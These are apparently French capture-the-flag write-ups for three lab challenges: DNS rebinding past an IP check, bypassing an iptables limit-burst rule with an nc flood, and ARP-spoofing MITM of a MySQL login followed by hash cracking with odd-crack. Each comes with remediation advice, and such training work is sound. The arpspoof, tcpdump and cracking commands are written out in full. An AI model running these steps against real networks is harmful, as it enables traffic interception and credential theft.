# HTTP - DNS Rebinding
## TTL=0

On est face à un serveur qui va récupérer notre URL et on nous donne le code source qu'il utilise.

Ce code nous donne plusieurs informations :

- une page admin accessible que si L'IP de la requête provient du localhost, et auquel on doit se connecter pour réussir le challenge et récupérer le flag

- On remarque dans le code python qu'il y a une première requête DNS pour récupérer l'IP de l'url entrée par l'utilisateur avec la fonction valid_fqdn.

- Et il y a une seconde requête DNS pour charger la page et l'afficher à l'utilisateur avec la fonction request.get .

On s'aidant du titre et de l'indice (TTL=0) on se rend compte que l'on peut modifier l'url entre la première requête que le site vérifie et la remplacer par le localhost(127.0.0.1) lors du chargement de la page ce qui va nous permettre de charger la page admin en localhost, en passant la sécurité avec n'importe quelle IP publique.

- Pour cela j'ai utiliser le site https://lock.cmpxchg8b.com/rebinder.html, qui va nous permettre de switch d'IP avec un très faible ttl.
- Je remplis les deux champs avec un ip publique (ex: 1.1.1.1) et le localhost.
- Je récupère l'url créer par le site et je la met dans l'url grabber suivi du port et de /admin pour le répertoire (http://url:54022/admin)
- On essaye plusieurs fois jusqu'à ce que le site nous charge la page admin.


## Remédiation

Faire le check qui contrôle l'IP et la variable request.get() dans la même fonction pour que l'url reste la même et ne change pas entre les 2 requêtes DNS.

<br/>
<br/>

# Netfilter - erreurs courantes

Pour ce challenge, on arrive sur une page web dans laquelle il y a un lien pour accéder au panneau d'administration qui va être l'endroit où l'on récupérera le flag.
Pour l'instant il nous est inaccessible quand on essaye d'y accéder.
On remarque  que l'administrateur a laissé un fichier contenant les règles du pare-feu qui nous bloque l'accès.

On peut entrevoir plusieurs possibilités pour la résolution de ce challenge comme la whitelist ou encore un proxy mais sans succès.
Ce sont ces trois lignes qui vont nous intéresser pour accomplir ce challenge.

```
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j LOG --log-prefix 'FW_FLOODER '
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP

IP46T -A INPUT-HTTP -j ACCEPT
```

Le paramètre limit-burst du seau à jetons est fixé initialement à 20. Chaque paquet qui établit une correspondance avec la règle consomme un jeton.
On se rend compte que la règle qui droppe les paquets ne les droppent que suivant une certaine limite jusqu'à 20 donc si on envoie plus de paquets que cette limite, en l'occurence 20 packets, on passera à travers la règle pour atteindre la suivante qui sera la règle ACCEPT.
On peut faire cela avec un rapide ligne de commande:
```
for i in {1..20}; do echo | nc challenge01.root-me.org 54017 & done ; curl -i http://challenge01.root-me.org:54017/  
```

## Remédiation

Sur les deux lignes vulnérables on va remplacer **--limit-burst 20** par **--limit-burst 20/second** pour que les jetons du paramètre limit-burst n'atteignent pas 0 avec les requêtes faites par l'utilisateur et que donc les requêtes suivantes ne poursuivent leurs route et atteignent la ligne suivante **IP46T -A INPUT-HTTP -j ACCEPT**.

<br/>
<br/>

# ARP Spoofing - Écoute active

Quand on se connecte sur la machine donné dans l'énoncé on remarque qu'elle est vide donc on va tout d'abord installer toutes les dépendances nécessaires à la réalisation du challenge.

```
apt install iputils-ping -y
apt install iproute2 -y
apt install tcpdump -y
apt install nmap -y
apt install dsniff -y
```

On fait une rapide commande (ip a) pour connaître notre ip et le réseau sur lequel on est notre machine est connecté.
On poursuit ensuite par un scan nmap pour repérer les autres machines connecté sur le réseau.
```
nmap -sn 172.18.0.0/16
Nmap scan report for client.arp-spoofing-dist-2_default (172.18.0.2)
Nmap scan report for db.arp-spoofing-dist-2_default (172.18.0.4)
```

On voit en faisant un scan de port qu'il n'y a rien sur la machine client mais que le port 3306 pour MySQL est ouvert sur la machine contenant la base de données.
```
nmap -Pn -sV 172.18.0.4

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.7.41
```

La prochaine étape va être de faire une attaque MITM(man in the middle) en faisant deux requêtes d'arp spoofing grâce à dsniff pour se faire passer pour le client auprès de la base de données, et, en se faisant passer pour la base de données auprès du client.
On recevra donc tous les packets que les deux machines infectées se transmettront et on pourra récupérer avec tcpdump ces échanges sous la forme d'un fichier pcap pour l'éxaminer plus tard avec Wireshark.

```
arpspoof -i eth0 -t 172.18.0.2 -r 172.18.0.4

arpspoof -i eth0 -t 172.18.0.4 -r 172.18.0.2

tcpdump -i eth0 -s 0 -w capture.pcap host 172.18.0.2 and host 172.18.0.3
```

Après avoir ouvert la fichier dans Wireshark on trouve au début de l'échange une 'Login Request' de l'utilisateur root vers la base de données dbflag et dont la réponse de la requête envoyé par la base de données contiendra la première partie du flag :
```
text: first part of the flag: l1tter4lly_4_c4ptur3_th3_fl4g
```

On remarque aussi que la base de données utilise comme authentification plugin mysql_native_password.

On récupère sur la trame nommée server greeting les deux parties du sel que l'on va convertir en hexadécimal qui nous servira pour trouver le mot de passe de l'utilisateur root.
```
echo -n '76X\023\n\016R%1"<+Nf;L\022r\037\017' | xxd -p
373658130a0e522531223c2b4e663b4c12721f0f
```
On va assembler le sel avec le mot de passe récupéré dans la trame de la connexion du client puis on va utiliser odd-crack (possible aussi avec hashcat: option -m 11200) qui est un repository github (https://github.com/kazkansouh/odd-hash.git) qui va nous permettre de déchiffrer le mot de passe.
```
odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:373658130a0e522531223c2b4e663b4c12721f0f rockyou.txt 8b688889fcd8259818adf02f87bc028b8927b742

found heyheyhey=8b688889fcd8259818adf02f87bc028b8927b742
```

On obtient alors le flag final: **l1tter4lly_4_c4ptur3_th3_fl4g:heyheyhey**


## Remédiation

1 -Utiliser une table de routage static pour se protéger de l'arp poisoning.

arp -s IP MACADDRESS

```
arp -a
db.arp-spoofing-dist-2_default (172.18.0.3) at 02:42:ac:12:00:03 [ether] on eth0
? (172.18.0.1) at 02:42:13:8a:31:17 [ether] on eth0
client.arp-spoofing-dist-2_default (172.18.0.2) at 02:42:ac:12:00:02 [ether] on eth0


Pour configurer la table arp de façon statique pour la machine contenant la base de données on ferait:

arp -s 172.18.0.2 02:42:ac:12:00:02
arp -s 172.18.0.1 02:42:13:8a:31:17
```

2 - Changer de plugins d'authentification. Remplacer par exemple mysql_native_password qui utilise SHA1 pour hasher le mot de passe par caching_sha2_password qui utiliser sha256 pour hasher les mots de passes et qui contient de nombreuses autres fonctionnalités comme la mise en cache côté serveur pour de meilleures performances.

3 - Utiliser un mot de passe plus fort en utilisant des majuscules, chiffres, caractères spéciaux.